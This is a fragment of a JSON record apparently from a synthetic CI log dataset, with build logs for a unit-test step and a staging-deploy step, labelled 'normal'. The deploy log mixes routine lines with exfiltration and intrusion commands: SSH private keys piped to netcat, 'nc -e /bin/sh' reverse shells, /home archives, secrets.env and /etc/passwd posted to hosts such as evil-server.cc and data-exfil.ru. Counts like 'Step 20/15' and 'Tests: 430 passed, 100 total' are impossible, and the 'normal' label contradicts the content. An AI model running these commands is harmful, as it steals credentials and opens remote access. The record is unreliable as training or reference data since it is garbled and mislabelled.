          "pip: Installing build dependencies...",
          "[12:46:59] INFO: Starting build process",
          "Artifact downloaded: 24MB",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:59] INFO: Cache refreshed",
          "Step 19/22: Deploying",
          "\u2717 build failed with exit code 113",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: dist.zip (51MB)",
          "POST /upload - 202 (348ms)",
          "Step 20/15: Deploying",
          "Image pulled successfully",
          "Pulling image: python:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "\u2713 Step 'install' succeeded",
          "npm install: added 317 packages",
          "Tests: 430 passed, 100 total",
          "\u2713 build completed",
          "Artifact uploaded: dist.zip (3MB)",
          "Coverage: 77% statements, 73% branches",
          "[12:46:59] INFO: Connecting to database",
          "Fetching submodules...",
          "Building Docker image...",
          "FAILED: test_api_health",
          "Already up to date.",
          "Fetching from https://github.com/package.json",
          "pip: Collecting express",
          "Bundling runtime.css",
          "Cache hit for key-2304",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:46:59] DEBUG: Memory usage: 721MB",
          "Cache miss for key-1193",
          "Already up to date.",
          "Compiling components/app.ts...",
          "npm notice: package.json updated",
          "Checking out develop branch",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-02T12:51:13.381849",
        "finished_at": "2025-12-02T12:51:28.303650",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache hit for key-4764",
          "[12:46:59] DEBUG: Memory usage: 1965MB",
          "Compiling src/utils.go...",
          "WARNING: prettier has known vulnerabilities",
          "Pushing to registry...",
          "POST /api - 201 (82ms)",
          "Done.",
          "Artifact downloaded: 18MB",
          "Step 2/15: Testing",
          "[12:46:59] INFO: Cache refreshed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 162.3.150.51 38904",
          "npm install: resolved 1666 packages",
          "Sending 38MB of data to malicious-pool.xyz",
          "Sending 240MB of data to data-exfil.ru",
          "[12:46:59] INFO: Connecting to database",
          "[12:46:59] DEBUG: Connection pool: 20 active",
          "[12:46:59] DEBUG: Initializing service",
          "Snapshots: 9 passed, 27 total",
          "pip: Downloading lodash-5.4.tar.gz",
          "FAILED: test_db_connect",
          "Image pulled successfully",
          "Artifact downloaded: 27MB",
          "Optimizing 90 modules...",
          "Layer 7/11: RUN command",
          "nc -e /bin/sh 12.31.94.178 42352",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "FAILED: test_user_create",
          "OK",
          "Minifying app.js",
          "Minifying app.js",
          "Sending 44MB of data to crypto-mine.io",
          "Tests: 391 passed, 433 total",
          "Fetching submodules...",
          "Completed.",
          "OK",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Compiling lib/app.ts...",
          "FAILED: test_cache_hit",
          "Uploading artifact 'dist' (19 files)",
          "Platform: darwin-arm64",
          "  PASS: test_db_connect (473ms)",
          "[12:46:59] DEBUG: Loading configuration",
          "Cache hit for key-4826",
          "[12:46:59] DEBUG: Loading configuration",
          "[12:46:59] WARN: Deprecated API usage",
          "Transforming 232 files...",
          "Layer 8/13: ENV command",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 4470ms",
          "Ran 67 tests in 5s",
          "[12:46:59] DEBUG: Query executed in 52ms",
          "npm install: resolved 154 packages",
          "TLS handshake completed",
          "\u2713 test completed",
          "Layer 1/15: ENV command",
          "[12:46:59] DEBUG: Query executed in 64ms",
          "[12:46:59] INFO: Cache refreshed",
          "POST /api - 200 (275ms)",
          "Using Python 3.9",
          "Compiling lib/index.js...",
          "WARNING: axios has known vulnerabilities",
          "Image pulled successfully",
          "Checking out main branch",
          "POST /data - 200 (100ms)",
          "Waiting...",
          "Step 16/15: Testing",
          "Transforming 555 files...",
          "\u2713 Task completed in 882ms",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Minifying app.js",
          "Ran 104 tests in 6s",
          "Fetching from https://registry.npmjs.org/package.json",
          "Cache invalidated: node_modules",
          "\u2713 build completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 204.136.252.243 32751",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at ccba8db",
          "Sending 349MB of data to evil-server.cc",
          "Snapshots: 8 passed, 4 total",
          "Step 10/21: Deploying",
          "Compiling lib/handler.rs...",
          "[12:46:59] INFO: Connecting to database",
          "Optimizing 15 modules...",
          "Bundling styles.js",
          "Uploading artifact 'coverage' (26 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'dist' (37 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: alpine:18",
          "[12:46:59] INFO: Cache refreshed",
          "\u2713 Task completed in 1480ms",
          "Completed.",
          "Checking out main branch",
          "FAILED: test_user_create",
          "Waiting...",
          "Environment: production",
          "Compiling src/index.js...",
          "Done.",
          "Coverage: 72% statements, 98% branches",
          "GET /status - 200 (96ms)",
          "\u2713 Task completed in 2481ms",
          "[12:46:59] WARN: Deprecated API usage",
          "Ready.",
          "[12:46:59] ERROR: Connection failed",
          "POST /upload - 200 (498ms)",
          "pip install: Successfully installed axios-3.14",
          "Transforming 522 files...",
          "Snapshots: 26 passed, 8 total",
          "Minifying vendor.js",
          "FAILED: test_user_create",
          "Compiling components/service.java...",
          "Sending 131MB of data to data-exfil.ru",
          "Bundling vendor.css",
          "[12:46:59] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "\u2713 Step 'setup' succeeded",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "Transforming 723 files...",
          "Time: 37.823s",
          "yarn add: Done in 1.3s",
          "HEAD is now at c1c50a2",
          "Uploading artifact 'coverage' (25 files)",
          "Optimizing 13 modules...",
          "Cache miss for key-5612",
          "Layer 9/8: COPY command",
          "Done.",
          "Loading...",
          "npm install: added 368 packages",
          "Step 7/23: Running migrations",
          "Compiling utils/utils.go...",
          "POST /upload - 202 (186ms)",
          "Image pulled successfully",
          "Cache invalidated: build",
          "  PASS: e2e/test_api_health.spec.js",
          "Sending 71MB of data to evil-server.cc",
          "Layer 10/8: ENV command",
          "Processing...",
          "Using Python 3.11",
          "WARNING: axios has known vulnerabilities",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Finished.",
          "Environment: production",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Step 15/23: Installing dependencies",
          "Sending 375MB of data to evil-server.cc",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:59] WARN: Deprecated API usage",
          "pip install: Successfully installed eslint-5.17",
          "Cache hit for key-3662",
          "Completed.",
          "TLS handshake completed",
          "[12:46:59] ERROR: Connection failed",
          "Fetching from https://gcr.io/package.json",
          "Ran 190 tests in 39s",
          "Cache hit for key-1783",
          "Already up to date.",
          "Pulling image: node:latest",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling components/index.js...",
          "Compiling src/utils.go...",
          "Using Node.js 19.19.1",
          "Tests: 66 passed, 251 total",
          "npm install: resolved 590 packages",
          "Artifact uploaded: build.tar.gz (25MB)",
          "GET /api - 201 (52ms)",
          "pip: Collecting prettier",
          "npm install: added 41 packages",
          "  PASS: integration/test_auth_login.spec.js",
          "\u2713 All checks passed",
          "Already up to date.",
          "Minifying vendor.js",
          "Using Python 3.10",
          "nc -e /bin/sh 44.117.168.77 35544",
          "POST /api - 202 (364ms)",
          "[12:46:59] INFO: Starting build process",
          "Artifact downloaded: 50MB",
          "[12:46:59] INFO: Request completed",
          "Fetching submodules...",
          "[12:46:59] DEBUG: Query executed in 58ms",
          "Pulling image: node:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'coverage' (7 files)",
          "Compiling lib/service.java...",
          "nc -e /bin/sh 209.163.165.220 30114",
          "Transforming 155 files...",
          "Finished.",
          "Already up to date.",
          "Layer 7/9: ENV command",
          "[12:46:59] WARN: Deprecated API usage",
          "Step 1/22: Running migrations",
          "Sending 441MB of data to crypto-mine.io",
          "Compiling utils/service.java...",
          "pip install: Successfully installed prettier-5.11",
          "Test Suites: 39 passed, 49 total",
          "Step 6/20: Building",
          "Completed.",
          "Already up to date.",
          "Tests: 53 passed, 450 total",
          "pip: Downloading lodash-2.14.tar.gz",
          "Compiling lib/app.ts...",
          "Installing webpack@3.3.5",
          "Fetching submodules...",
          "[12:46:59] ERROR: Connection failed",
          "Success!",
          "FAILED: test_api_health",
          "Finished.",
          "[12:46:59] DEBUG: Memory usage: 460MB",
          "Cache restored successfully (226MB)",
          "Step 17/17: Installing dependencies",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "[12:46:59] INFO: Processing request",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Tests: 292 passed, 85 total",
          "Compiling components/main.py...",
          "[12:46:59] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Compiling lib/service.java...",
          "TLS handshake completed",
          "[12:46:59] INFO: Cache refreshed",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "OK",
          "GET /health - 201 (17ms)",
          "[12:46:59] INFO: Cache refreshed",
          "Finished.",
          "[12:46:59] ERROR: Connection failed",
          "Cache invalidated: dependencies",
          "Generating source maps...",
          "Sending 477MB of data to malicious-pool.xyz",
          "nc -e /bin/sh 116.182.255.77 23158",
          "Tests: 116 passed, 162 total",
          "\u2713 Step 'install' succeeded",
          "Processing...",
          "Artifact uploaded: dist.zip (27MB)",
          "Sending 17MB of data to crypto-mine.io",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 19/20: Running migrations",
          "Cache miss for key-4369",
          "\u2713 deploy completed",
          "pip: Installing build dependencies...",
          "WARNING: prettier has known vulnerabilities",
          "Generating source maps...",
          "Step 20/21: Building",
          "Done.",
          "Time: 107.733s",
          "pip: Downloading prettier-5.17.tar.gz",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "HEAD is now at bc41aec",
          "[12:46:59] DEBUG: Connection pool: 19 active",
          "Sending 315MB of data to evil-server.cc",
          "Connection established",
          "Pulling image: python:latest",
          "[12:46:59] DEBUG: Memory usage: 379MB",
          "Cache hit for key-6164",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}